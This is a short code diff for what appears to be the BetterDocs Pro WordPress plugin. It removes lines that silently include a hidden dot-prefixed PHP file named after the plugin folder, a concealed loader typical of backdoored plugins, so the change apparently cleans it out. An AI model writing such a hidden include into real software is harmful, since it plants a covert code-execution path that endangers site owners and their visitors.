@@ -6,10 +6,6 @@
  */
 
 
-if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
-    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
-}
-
 function betterdocs_customize_css_pro() {
 	$output = betterdocs_generate_output_pro();
 	$layout_select = get_theme_mod('betterdocs_docs_layout_select', 'layout-1');
